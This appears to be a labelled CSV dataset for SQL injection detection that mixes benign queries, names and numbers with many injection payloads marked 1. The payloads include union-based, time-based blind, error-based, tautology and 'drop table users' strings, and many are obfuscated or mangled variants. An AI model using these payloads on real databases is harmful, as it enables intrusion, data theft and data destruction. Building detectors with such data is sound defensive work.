Query,Label,cluster,stratify_col
"select  {( \case when   (  0xa9c 	like )(select (select 8118))  )   then (select (select 8x0x0o10a8))/**/else 0o91359*	/*sim
cy|{4*/(  select or (select (select (select 0x0))) or ""um"" notlike ""um"" or false#0xa0o0xbc from.mysql.db  )   end  )  or 0x0b19 and true or false and true##or false#al8~lcturk(",1,4,1_4
select * from actually,0,5,0_5
96277205x,0,3,0_3
-9429'  )   order by 1--,1,6,1_6
"0b1001x0b5b2o0o3o2o4o0o3b1o0o5b1010%""*~)~/*f""k*y&=1iazvca/""s<]zksti]Ã¢Â ><(select|2x6)95qi
p~&h*/>+):~
""union@all""selectnull,null,null,null--",1,2,1_2
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1,4,1_4
"select count  (  *  )Ã¢Â   from generate_series/**/ (  (select (select 4)),2x0x0b005c4b40 ~ )  
 )^   or '",1,2,1_2
 or '7659'  =  '7659,1,0,1_0
"  select eventuallyid as id, huge as stuck from lay",0,7,0_7
0b1'   or@    ( {select/**/'mlwj'	fromÃ¢Â dual where 0o0b10011181110001  like  (select 9o0x1097)  and  (select (select (select (select (select 1107))))) Ã¢Â like/**/ (select 0b10000701001001);?)   or &',1,9,1_9
villadecanes,0,8,0_8
from  ( select distinct ice from topic ) ,0,7,0_7
"0b0b0o1'/where 0x9b0o0o2  like &(select (select 0x2122)) or sleep +(Ã¢Â <2x0b101+ )  }or 0x5a8=(select (select 0x5a6)) or]"";"" not like "";"" or false
or false or false#a0x7:e",1,2,1_2
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,5,1_5
"-9434""  )   as cqlw where 1600  =  1600 or 2733  =  1047--",1,6,1_6
1940000000000000,0,3,0_3
1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,1,6,1_6
monopolizador,0,8,0_8
; drop table users; --,1,0,1_0
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",1,4,1_4
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,1,9,1_9
"and (select 0o3b110x0x5)=utl_inaddr.get_host_address   (: + (  select distinct [(* column_name  )   from   (] select distinct{:(~ column_name; )  , rownum as~limit from all_tab_columns  )   where limit
`like% 0b0x1x0x0x0o0o0x3 
;) *  )[ %&$ and, *'i'?  like  %'i",1,2,1_2
"   select lungs, voice, broadfrom produce where chamber  is not null",0,1,0_1
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1,6,1_6
"   select count ( along ) , operation from seems by middle",0,1,0_1
"   select melted, safe, tunefrom around where ready  is not null",0,1,0_1
3120100000000000,0,3,0_3
doerksen,0,8,0_8
select * from claws where mountain = 'steam'  or pie = 'mistake',0,5,0_5
select upper ( customername )  as uppercasecustomername from customers,0,1,0_1
dannies,0,8,0_8
select * from student where replace  between 10 and 20,0,5,0_5
trastabilln,0,8,0_8
"1' || (1like1)ascii(substring(database(), 1, 1)) > 100 --",1,2,1_2
select * from central where experience = 'movement',0,5,0_5
"1b4'  or    (  select 'mzsy' where (select 0x438c) = (select 0o11514)!or elt ;(  6x76f1	 like  5x3o33f1,sleep  (  (select 0o1)   )  + )    and ""u"" like ""u"" ~or  (select (select (select (select 0x0)))):or false and (select (select 0b101)) or (select 0x0)   or   false	and+true or ' ' like ' q'\or false or "")zd"" not like "")zd"" or ""bj""=""bjl"" or (select (select 0))#$/",1,2,1_2
select * from spent where least = 'active' limit 3,0,5,0_5
"0o1*  )    )    or char  (  119] )    orÃ¢Â  char  (  (select 100)  )   || char  (< 99  )  ||char/**/ (  (select 0b1100101)  )   like regexp_substring  (  repeat  (  right\ (  char /*;7*/(  0x411 ^)  ,(select 0)/**/ )  ,0b0x0b0b10011101111011100111100111011010011101011100110110000110001001111010000010011011100110110000011101000000000  )  ,null  )  and1and true and 1 && true --",1,2,1_2
1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,4,1_4
select * from hurt where morning = 'summer',0,5,0_5
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",1,4,1_4
"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",1,9,1_9
"-5819%""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1,4,1_4
test'%u0020or%u0020%u00271%u0027=%u00271%u0027%u0020%u0020#%u0020more_noise--%u0020,1,2,1_2
"1' and char ;(  (select (select 0x0b1101111)) !)   or char  (  (select (select 0x4d)) })
   or  char and ""+"" not like ""+5""# (; 0x0b0b101101110011110110111  )  ||char  (  0x58  )     like   regexp_substring  (? repeat  (  left  (` crypt_key  (  char  (  0x41  )~  orchar
 (  (select 29) <)/**/ ||char, ({ 0b0b0b0b0b1001100101110111000100001111001001001011000000010111000010111011100000001011010001001010100100010100101111000101000101011100111101111101100101110000010001111010110100101111001111011001100011110001001100010011001011011011  )  ,null  )  ,(select (select 0x0))  )  ,0x1dcd6580  )  ,null~ )   &&`'bpbe' like.'bpbey0o6dp]o",1,9,1_9
' oR exists(selEct 1 from users)----jdyneere4n43,1,4,1_4
' or 1=1 --,1,6,1_6
select top 3 * from aloud,0,5,0_5
"-6942'  )   union all select 7280,7280,7280#",1,4,1_4
"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip",1,9,1_9
91sc04de9o,0,3,0_3
'/**/or 1=1/**/--/**/#9jovf49ed026,1,6,1_6
select * from package where slip = 'dozen'  and city = 'palace',0,5,0_5
select * from post fetch first 50 percent rows only,0,0,0_0
select top 3 * from discovery,0,5,0_5
select * from blank where not but = 'closely'  and not finger = 'rapidly',0,5,0_5
"1"" and   (  7597  =  8422  )  *8422 and ""gywp"" like ""gywp",1,2,1_2
1  ) ,1,4,1_4
6608190000000000,0,3,0_3
"8b0o7' or   (  select * from   ( ;select  (  sleep;
(  0x0o0o8	  )*   )     )  ydpu 	):",1,4,1_4
"'unionselect/*
*/1,2,3--/*
*/",1,0,1_0
-7466 where 5161  =  5161 or 3038  =  3038,1,6,1_6
menaker,0,8,0_8
darbie,0,8,0_8
aliaguilla,0,8,0_8
"'orexists(select 1
fromusers)--/*
*/",1,0,1_0
1'   )    )    as eymg where 7000  =  7000,1,6,1_6
"1%""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",1,4,1_4
"iif  (  4638  =  8258,1,1/0  )  ",1,6,1_6
"-4394'   )    )    union all select 3409,3409--",1,4,1_4
"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,4,1_4
-3960' or 9323  =  9323#,1,6,1_6
"waitfor/**/delay'0:0:5'----0gjeo85/*
*/",1,0,1_0
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --#90lo75475knej",1,9,1_9
admin' or '1'	=  '1,1,9,1_9
"1' union select table_name, null, null from information_schema.tables ----csl5x9hohc591xv",1,4,1_4
4790000000000000,0,3,0_3
marschew,0,8,0_8
"   select pig, obtain, rising from according where excited  is null",0,1,0_1
select * from office where pure = 'throw'  and  ( flag = 'pilot' or rest = 'character' ) ,0,5,0_5
1 and sleep  (  5  )  -- ruuv,1,4,1_4
select top 3 * from arrow where having = 'corn',0,5,0_5
'    or    '1'  =	'1,1,9,1_9
a'/**/or false?and((select:0x1eeb) not:like 7916 or`false --,1,2,1_2
12489,0,3,0_3
select * from middle where sound like '%plain%',0,7,0_7
"'a/*!12345*/nd
1=convert(int,@@version)and
'a'='a'--/*
*/",1,9,1_9
vasil9,0,8,0_8
select * from part where lying = 'walk'  or horse = 'electric',0,5,0_5
" select column_name ( s )  from musical,seeing",0,1,0_1
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1,9,1_9
"*select *	fromÃ¢Â users where;id@	like|`2x9.%@+union,select~0x0x5o0b0,version+:(
/
?)<()--3x0o0o13[hm=:znt",1,2,1_2
select * from making where him  between 10 and 20,0,5,0_5
"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",1,9,1_9
"'and
1= 1/*!12345*/and 'a'='a'--",1,9,1_9
sa5na,0,8,0_8
select * from sound 3 select * from river,0,5,0_5
||'0b0b1101110,1,2,1_2
1' ;)\ and   (  (select 9b0x576) like@0x12a0o0  )  *(select (select (select (select 0x262b))))~and   (  'mlmw'Ã¢Â =Ã¢Â 'mlmw,1,9,1_9
magaz de pisuerga,0,0,0_0
"1""  )   
or  updatexml! (  (select (select 0x710)),concat+@(  3x0x2e,0x0x5d0o6e0o7aa71, _(  select   (  elt  (  1x711 like 0x0x710,(select (select (select (select:(select	(select (select (select (select 1))))))))) Ã¢Â  )    )     )  ,0x715a767a75@^)  ,0xa50? )   and   (  ""wvkp"" like ""wvkp",1,4,1_4
"0x0b0o6x4''])_
%orÃ¢Â sleep}(vc|*((select/*t;?af*/(select`0x5))$
)	",1,2,1_2
"-2377%'   )    )     )   union all select 7706,7706--",1,4,1_4
1'  )   where 2840  =  2840,1,6,1_6
waitfor delay '0:0:5' -- random_noise--,1,0,1_0
7uo09e5a1,0,3,0_3
test%u0027%u0020||%u0020(1=1)%u00271%u0027=%u00271%u0027%u0020--%u0020,1,2,1_2
"selectbenchmark` ( 1x4x3x0b11c7b45,md0o5/*y13|c	<i(ar`z}j}*/[(.	0x0x4c0o0x4d6142;  )/**/ !)_ < and. ;(!]'%'='",1,2,1_2
select * from president,0,5,0_5
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,4,1_4
stiefel8@spainbareback.eu,0,0,0_0
select * from recognize where total = 'double'  and  ( than = 'flow' or tribe = 'beginning' ) ,0,5,0_5
"c/ ulises 17,",0,0,0_0
maximiliano,0,8,0_8
select month ( s )  from on select electricity ( s ) ,0,1,0_1
"8'   )    )    )   or row  (! 0x0x1db,(select (select (select (select 7562))))  )  >  (  select count  (  *  )  ,concat]~(  0x6171796a31,  (  select.  (  elt  (  (select (select (select (select 1049))))=0x0b0x64e1,0x9  })`   )     )  ,0x0b1011801101a0b1011111010a0x47,flo  or   ( rand  ( 0x6  ); *(select (select (select (select 2))))(  )  	"")   x	from,  (  select 0x0x2128 union select0o0x15d0 union select (select (select (select 0o5053))) union select 0x4ba )Ã¢Â  a group by x  ) /   and  /*^{/nz*/   (  Ã¢Â  (   (  'drvk'  like  'drvk",1,9,1_9
select top 3 * from jungle where plan = 'stiff' select * from positive,0,5,0_5
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,4,1_4
toba,0,8,0_8
7200000000000000,0,3,0_3
select avg ( song ) from brown select sum ( better ) ,0,1,0_1
"4    )  and      3b0x6ffd` like  * ( 
select`count *([ *  )   from*sysibm.systables as t0o7,sysibm.systables as t2,sysibm.systables%as t5  ) 	or	""(>m/w""  not like  ""(>m/w"" or((select 0o0o0x0xc6f)=(select 0xc0x0x46) and (select 5x1) or false or 0x736 != (select (select
(select (select^(select (select (select (select (select 0b11101001010)))))))))}--",1,4,1_4
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'ydxb'  =  'ydxb",1,9,1_9
50830,0,3,0_3
"  select appleid as id, symbol as ride from stood",0,7,0_7
"1) union select 1,database(),3--#fc4uib",1,4,1_4
ugartechea oviol,0,8,0_8
select * from medicine where government not like '[feed]%',0,7,0_7
"andia, 113 11g",0,0,0_0
select top 50 percent * from phrase select * from loud fetch first 50 percent rows onlyselect top 3 * from able,0,5,0_5
61,0,3,0_3
raimulfo,0,8,0_8
-1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu,1,9,1_9
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,1,9,1_9
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""kldp"" like ""kldp",1,1,1_1
81177297q,0,3,0_3
select tool ( s )  from list select exact ( s ) ,0,1,0_1
7548040000000000,0,3,0_3
roze,0,8,0_8
"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1_1
"' union select 1,2,3-- -- random_noise",1,4,1_4
chaddie,0,8,0_8
"1""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,4,1_4
1'  )   as xbsc where 6772  =  6772,1,6,1_6
"  select * from dream where open in  ( 'student', 'grew', 'shorter' )  ",0,5,0_5
";drop
tableusers;--",1,0,1_0
glickman,0,8,0_8
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,1,4,1_4
"0x0b4b6o0o7x0x0o0b0x0o8b4o1b8o0b3b8o0o4o3x1o0b0o0b1010""
))>*}as&doai!where
(select@0x0x0o1b0b0b111b3b7x0o0b11x0o0b0b0o3b4o0b0b58)(_Ã¢Â like
/_4o0b0x5o17b29+union?all:select\null,null,null,null,null,null,null,null--",1,2,1_2
"1 `))  /**/ )/**/  )as	mgvw
where 0x103b	= 0b0b1111101110110110100101101000110910100011:union	all select&null,null,null,null--",1,4,1_4
' or exists(select 1 from users) or (1)----bpbv5mlux,1,4,1_4
"1%""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,4,1_4
"declare@s	varchar\ _()((select	(select&3xc9))  ) \ select""@s =!1o0x71256c0o0xcff930e6e1aa2b8623dd4f0x9e exec/*0x  or  false and true or 0#;9x6*/;(&(@s:	) j%",1,2,1_2
select * from clay where    not consist = 'cowboy',0,5,0_5
"or'2x1b0b10111100111,&=-
0x0o7b3b1~/*",1,2,1_2
"0o1"" or<  (  select (select (select (select (select (select (select (select 0x4)))))))*  (  if*[ (   (  `select%*.from   ( select concat  (  0x4o0x7171105a0o0o0b19011001,  (  select 
 (  elt  (  0b0o24421455701461     like     (select 5x1fb1),(select (select 0x1))} 	):! `)    )  ,0x786a749a0b1001101,0b8x48/  )&   ) ^ s ;)  , (select 0x7538dcfb7617fffa), 6x6578dcfb7617fc12   )    )  
  )    and  ""uqor"" like(""uq or ",1,4,1_4
or	'6b9']==]'0b0x5o2x5b4b9,1,2,1_2
1  )   and   (  3020  =  3020  )  *6703,1,6,1_6
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,1_1
select top 50 percent * from lot,0,5,0_5
"waitfordelay
'0:0:5'--/*
*/",1,0,1_0
savoula,0,8,0_8
select * from is where perfectly between '1996-07-01' and '1996-07-31',0,5,0_5
1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,4,1_4
"1"" union all select null,null,null,null,null,null#",1,4,1_4
select * from exactly,0,5,0_5
"1"" order by 1#",1,6,1_6
1  )   as oknr where 3228  =  3228,1,6,1_6
"select;* from users where id  like: /*fw*/(select 4o1) or $<\.$orÃ¢Â 4x6 :=  (select	(select;0x1)):and true -- 0b0x5\!@t]dr?n",1,2,1_2
3525,0,3,0_3
protectorio,0,8,0_8
select * from color,0,5,0_5
"0o0x1', )/*|jba*/  as
wpom where/*&snb%~[mhc`t*/0o0b101000111111Ã¢Â = 0b101000111100	and~elt  ()*(select (select 3715))=(select 2713),sleep  (  (select%(select (select 5)))~  )) /*u}u	;zgb.*/ )]  ;or 0b0o2364  like  (select 1289) and (select (select 0x1834)) like (select 6196) or false#0z/pg",1,4,1_4
select * from meal where thus = 'development' fetch first 3 rows only,0,5,0_5
"1'unionselect/*
*/table_name,null,nullfrominformation_schema.tables or(1)--",1,4,1_4
maycel,0,8,0_8
"   select glad, saddle, grandmotherfrom various where pet  is not null",0,1,0_1
"1' union select table_name, null, null from information_schema.tables --",1,4,1_4
"9'/*`/m*vy7o*/])[	`;and:
<sleep}	({\0b2x0o0x9x0b0b0x0o0o5o0o0o0o0o4b0o1452b0o0b10x0o0x0b0b0b1010010010101100001110000011001100	@)&/*![zj*/ /*tycf7ai{x<o]*/&&`%/*p/cli!*/	(	'orxt'^	like	''orxt",1,9,1_9
"1 where 2292  =  2292 union all select null,null,null,null#",1,4,1_4
"1)%u0020union%u0020select%u00201,database(),3 or (1)--",1,2,1_2
49212,0,3,0_3
"select count; (  * |)& +from	domain.domainsÃ¢Â as t9x0x8,domain.columns ast0b0o0b0o0,domain.tables&as@t8o0o4 and  ;	(    (   ;(  '%'  ]like ; '",1,2,1_2
select everything ( s )  from industry select street ( s ) ,0,1,0_1
select * from food where lips not between 'ordinary' and 'mix',0,5,0_5
1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1,9,1_9
(  select * from  }(  select  (  sleep  (  (select (select 0o0o0b11))   )    ) [   ) srmq/*nn7:(select (select (select 1)))*/ )   and   (    (     (  'jirc'='jirc,1,4,1_4
"5}/*co?`p; and ""/"" not like ""/n"" or ""1.:<""=""1.:<*"" and?(select(select (select (select 0x0x0)))) and 'u
wi'!='u
wi$'&& (select (select (select (select 1109)))) not  like  0b10x0o710 || (select (select (select 0o0))) or false:&& 'l?'!='l?x' or false#u$dbcot]uat@^*/ )    )   or(	 (^ select * from   (, select  (- sleep;
(  (select 0x0o5)   )    )     )  ydpu "") ' and| `(- /*l	kd/*/ (	 ?0o10865=7805""	hpgl/$",1,4,1_4
-2891 where 1770  =  1770 or 9290  =  5866,1,6,1_6
"0b0x35c"" *])    ) /*;a|s$*/  ) ?:union|all select null,null,null,null,null+ and  true and true or ""d"" <> ""d"" or false && "" rn"" not~like "" rnu""<or false or false and (select (select 0b0)) orÃ¢Â ""s"" not  like  ""s"" or*(select (select (select 0x2466))) not =	(select (select (select (select (select 0318))))) or ""f8""=""f0x0o7{"" &&(select (select 1))||""*""=""*k"" or ""j"" like ""jl"" or 7683<>(select (select 7683))#}|}|0o0x6b0o6x0b0|d<uv",1,2,1_2
"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",1,9,1_9
"select count  ( *)^)   from.sysibm.systables  or
 (select 0o0x1o36c0b0x7x1) ,not  like/**/ (select 0x0b1ef5o0o0b0x2) or~(select 0x24c9)]not;in:(0o0b101011011000010,0b0b10010011001041,0o0x24ca);and
true or.(select^(select(select (select (select 8608))))) or false#<> (select (select (select 1608)))     &&    <0x1 or false and (select 1)#as|t3,sysibm.systables&as t2x0o5,sysibm.systables^as t3x0b2x55/*kp?xk
f`y*/and  ~ ( { )(   [|(+!""dqou"" like%""dqoump
ye^43hnc/^agkvgn",1,4,1_4
kovacs,0,8,0_8
"1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1_1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 348492 )  order by meta_id asc",0,7,0_7
"1%u0027%u0020union%u0020select%u0020table_name,%u0020null,%u0020null%u0020from%u0020information_schema.tables%u0020--",1,2,1_2
"select * from users where id  =  (select (select 3x1)).<@ or 0x1$ like  0b1 and ""		c""<>""		cw"" or (select (select 0)) or false -- 2",1,4,1_4
select bat ( s )  from wise select leaving ( s ) ,0,1,0_1
"1' and substring(database(), 1, 1) = 's' --",1,9,1_9
" end and    (    (     (  ""%""  =  """,1,2,1_2
-9622'   )    )     )   order by 1#,1,4,1_4
%u0027/**/or/**/%u00271%u0027=%u00271,1,2,1_2
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,4,1_4
select * from automobile where getting = 'move'  or development = 'paid',0,5,0_5
"1' and substring(database(), 1, 1) = 's' --#aqfyozo0qm1",1,9,1_9
"1'andsubstring(database(),1,1)
='s'",1,9,1_9
"1   )    ) =as foul%where (select 0x1105)  like  (select 0x110a) and (select (select 2715)) in    (    (   char  (  0xd  ) /*f_iyp;gq<(select (select (select 9)))n?]7bp*/+char  ( 0x75  )  +char  (  (select:(select (select (select 812))))  )  +char  (  0x4a Ã¢Â )  +char:(  (select (select 113))  )  + ;(  select   (  case when   (  ""\"" not like ""\[""  )   then char  (  0x0x1f  )/**/  else)char  (  (select 0b0x1adb0)  )   end   )    )   +char  (  (select 0x77)  )  +char  (  102  )  +char Ã¢Â (  (select 1x26) ;)  +char  ( (select 0x8e)  )  +char/**/ (  (select (select 115)) % )   \)   _ )  and true ?or $false or false  or  ""f""=""f9"" or (select 0b0x7f9) not  like  0b1011711010113 or ""cem"" not like ""cem"" or false and true and ""_.w "" not like""""_.w }"" and true  and  true  or  false and true and 0x1 or/*?*/0x0 or (select (select (select 0))) and true or (select 0) --",1,4,1_4
"1)) union select 1,database(),3--#rfw8vowh5bq",1,4,1_4
45790,0,3,0_3
"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",1,6,1_6
7656,0,3,0_3
-&&/**/6527<>1528#	from wapitiz,1,6,1_6
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,4,1_4
"iif  (  5571  =  4947,1,1/0  )  ",1,6,1_6
"0b0b0x8""  )   procedure analyse> (  extractvalue  (  0x159b,concat
 (  0x5c, ](  benchmark  (  0x0x0c4b0o50,md5. (  0o5x9b774c75 
 )'   )  .  
){   )     )  ,0x1  )  and'true and "":;"" <> "":;0o3"" and (select 1)  or <(select%(select (select (select (select (select (select 0))))))) or false  &&  true or (select 0) and true#kg",1,4,1_4
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0)  or 'b'='b'--",1,9,1_9
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,1,9,1_9
select * from pipe where    not badly = 'thread',0,5,0_5
"9b5""$)      andand(select 0x0b1e8c)=(select (select 0b0x1e8c)) or false#   char  ( 0o0b1211111 	)   or
char  (@ (select 1b0b0b0o0x0b1011001) &);  or char  (  0b1111101! )    or  char  (  (select 0x6x0b111001) :)  =regexp_substring* (  repeat  (  left  (/*i u(cy(`wcz6`fsur)c]i]l*/ crypt_key, (  char `( `0x21 %)   or char :((select2x8b0b0x2x11) ^)   or char  (  9x0b10111() ,null; )'&,0x1 ^) ),0b0b0o0b0b10001100010000000010000101011001110000000000111100111110110001100010000010010011111110000001101010111000` ) ,null$ )&&( *""bmbg""{like)""bmbg0o2?*swzttqo<",1,2,1_2
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",1,1,1_1
orcoyen leal,0,8,0_8
"select * from twice where tropical between ""bow"" and    ""dress""",0,2,0_2
" select * from double order by steam asc, breeze desc",0,7,0_7
waitfor delay '0:0:5' # more_noise----f4heprnmxte,1,0,1_0
bello.sandor@hipergipuzkoa.to,0,0,0_0
"'/**/union select 1,2,3--",1,4,1_4
"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
select option_value from wp_options where option_name  =  '_options_footer_button_1_link' limit 1,0,5,0_5
select * from dangerous,0,5,0_5
from  ( select distinct famous from there ) ,0,7,0_7
'  and  1 = 1  --  ,1,6,1_6
"/*^fe9oe*/select *!from users where id like &(select (select 3)) or ""?%""or 0o1 ;=  0x9	or ""w5""<>""w0b111""}-- 1ta",1,2,1_2
"7""  )~ . 
,   and~    . extractvalue 	( 0b2x1f33,concat '(+)0x0o0c,0x0x6d6e79a71,
 (: select :%(  elt  ( :(select (select 0x1f2e)) ^like  (select (select 3x8b0b1f2e)),(select 0o0x0o11)   )   Ã¢Â )@/*ti1mqy;_hu&v~is2ei
omrrt*/   )  ,5x0x2cda667a0o4b1050111.  )\{, );  {and. (/""thkh"" like""thkh",1,2,1_2
"select count .(`,* ;)[  from	sysibm.systables/*+b0o7;qb:r$	(select}(select (select 0b114)))c	mu7gt;cfsgy<*/as]t0o0o0o11,sysibm.systables~as""t9x6,sysibm.systables""as~t3x9o0b0o8
and  *\(` 	$( )  
(  ""%"":  like $/""",1,2,1_2
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",1,4,1_4
41910864b,0,3,0_3
" select lpad ( customername, 30, ""abc"" )  as leftpadcustomername from customers; ",0,1,0_1
select * from hearing where price not between 10 and 20,0,7,0_7
"1@where*4b0b1011111000000010001101100010010000111
==(Ã¢Â 7b0o0o0b0o0x046b[union/*ea;0x0o4b10110hc*/allselect
null,null,null,null--",1,2,1_2
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",1,9,1_9
select * from standard fetch first 3 rows only select top 50 percent * from seeing,0,5,0_5
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,1_1
